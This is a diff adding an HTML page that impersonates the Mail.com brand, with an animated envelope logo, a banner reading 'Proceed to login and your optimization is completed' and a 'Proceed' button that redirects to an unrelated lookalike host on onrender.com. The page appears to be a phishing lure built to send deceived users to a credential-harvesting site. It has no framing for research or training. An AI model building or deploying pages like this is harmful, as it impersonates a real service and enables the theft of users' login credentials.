@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mail.com</title>
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: #ffffff;
+      color: #111111;
+      font-family: Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    @keyframes floatLogo {
+      0%   { transform: translateY(0px);  box-shadow: 0 8px 20px rgba(211,47,47,0.25); }
+      50%  { transform: translateY(-8px); box-shadow: 0 16px 28px rgba(211,47,47,0.15); }
+      100% { transform: translateY(0px);  box-shadow: 0 8px 20px rgba(211,47,47,0.25); }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(14px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .mail-logo {
+      width: 110px;
+      height: 110px;
+      border-radius: 50%;
+      background-color: #d32f2f;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: visible;
+      animation: floatLogo 3s ease-in-out infinite;
+      box-shadow: 0 8px 20px rgba(211,47,47,0.25);
+    }
+
+    .mail-brand {
+      font-size: 32px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      line-height: 1;
+      animation: fadeIn 0.6s ease-out 0.2s both;
+    }
+
+    .mail-brand .black { color: #111111; }
+    .mail-brand .red   { color: #d32f2f; }
+
+    .mail-btn {
+      background-color: #2196f3;
+      color: #ffffff;
+      border: none;
+      border-radius: 4px;
+      padding: 14px 0;
+      width: 200px;
+      font-size: 17px;
+      font-family: Arial, sans-serif;
+      font-weight: 400;
+      cursor: pointer;
+      letter-spacing: 0.2px;
+      transition: background-color 0.2s ease;
+      animation: fadeIn 0.6s ease-out 0.4s both;
+    }
+
+    .mail-btn:hover { background-color: #1976d2; }
+
+    .page {
+      min-height: 100vh;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .top-banner {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      padding-top: 16px;
+    }
+
+    .top-banner-inner {
+      background-color: #f0f4ff;
+      border: 1px solid #c7d5f8;
+      border-radius: 6px;
+      padding: 10px 20px;
+      font-size: 13.5px;
+      color: #2a3a6e;
+    }
+
+    .center-area {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 24px;
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <div class="top-banner">
+      <div class="top-banner-inner">
+        Proceed to login and your optimization is completed
+      </div>
+    </div>
+
+    <div class="center-area">
+      <div class="mail-logo">
+        <svg
+          id="envelope-svg"
+          width="64"
+          height="58"
+          viewBox="-2 -20 64 68"
+          fill="none"
+          xmlns="http://www.w3.org/2000/svg"
+          style="overflow: visible;"
+        >
+          <!-- Envelope body -->
+          <rect x="2" y="6" width="56" height="40" rx="3"
+            stroke="white" stroke-width="3" fill="rgba(255,255,255,0.12)" />
+
+          <!-- Letter peeking out -->
+          <g id="letter" style="opacity: 0; transform: translateY(0px);">
+            <rect x="14" y="-12" width="32" height="22" rx="2" fill="white" opacity="0.9" />
+            <line x1="19" y1="-6" x2="41" y2="-6" stroke="#d32f2f" stroke-width="2" stroke-linecap="round" />
+            <line x1="19" y1="-1" x2="41" y2="-1" stroke="#d32f2f" stroke-width="2" stroke-linecap="round" />
+            <line x1="19" y1="4"  x2="33" y2="4"  stroke="#d32f2f" stroke-width="2" stroke-linecap="round" />
+          </g>
+
+          <!-- Envelope flap -->
+          <path id="flap"
+            d="M 2 6 L 30 28 L 58 6"
+            stroke="white" stroke-width="3"
+            stroke-linejoin="round" stroke-linecap="round"
+            fill="rgba(211,47,47,0.0)"
+          />
+        </svg>
+      </div>
+
+      <div class="mail-brand">
+        <span class="black">Mail</span><span class="red">.com</span>
+      </div>
+
+      <button class="mail-btn" onclick="window.location.href='https://m-il1zz.onrender.com'">
+        Proceed
+      </button>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      var flap   = document.getElementById('flap');
+      var letter = document.getElementById('letter');
+
+      var CLOSED_Y = 28;
+      var OPEN_Y   = -16;
+      var LETTER_OPEN_Y = -10;
+
+      function lerp(a, b, t) { return a + (b - a) * t; }
+
+      function easeInOut(t) { return t < 0.5 ? 2*t*t : -1+(4-2*t)*t; }
+      function easeOut(t)   { return 1 - Math.pow(1 - t, 3); }
+      function easeIn(t)    { return t * t * t; }
+
+      function setFlap(y) {
+        flap.setAttribute('d', 'M 2 6 L 30 ' + y.toFixed(2) + ' L 58 6');
+      }
+
+      function setLetter(y, opacity) {
+        letter.style.transform  = 'translateY(' + y.toFixed(2) + 'px)';
+        letter.style.opacity    = opacity.toFixed(3);
+      }
+
+      function animate(duration, easing, onProgress, onDone) {
+        var start = null;
+        function step(ts) {
+          if (!start) start = ts;
+          var elapsed = ts - start;
+          var t = Math.min(elapsed / duration, 1);
+          onProgress(easing(t));
+          if (t < 1) {
+            requestAnimationFrame(step);
+          } else {
+            onDone && onDone();
+          }
+        }
+        requestAnimationFrame(step);
+      }
+
+      function wait(ms) {
+        return new Promise(function(res) { setTimeout(res, ms); });
+      }
+
+      async function loop() {
+        while (true) {
+          await wait(1200);
+
+          // Open flap + raise letter (simultaneously)
+          await Promise.all([
+            new Promise(function(res) {
+              animate(500, easeInOut, function(t) {
+                setFlap(lerp(CLOSED_Y, OPEN_Y, t));
+              }, res);
+            }),
+            new Promise(function(res) {
+              wait(250).then(function() {
+                animate(400, easeOut, function(t) {
+                  setLetter(lerp(0, LETTER_OPEN_Y, t), lerp(0, 1, t));
+                }, res);
+              });
+            }),
+          ]);
+
+          await wait(900);
+
+          // Lower letter + close flap (simultaneously)
+          await Promise.all([
+            new Promise(function(res) {
+              animate(300, easeIn, function(t) {
+                setLetter(lerp(LETTER_OPEN_Y, 0, t), lerp(1, 0, t));
+              }, res);
+            }),
+            new Promise(function(res) {
+              wait(150).then(function() {
+                animate(500, easeInOut, function(t) {
+                  setFlap(lerp(OPEN_Y, CLOSED_Y, t));
+                }, res);
+              });
+            }),
+          ]);
+
+          await wait(900);
+        }
+      }
+
+      loop();
+    })();
+  </script>
+</body>
+</html>
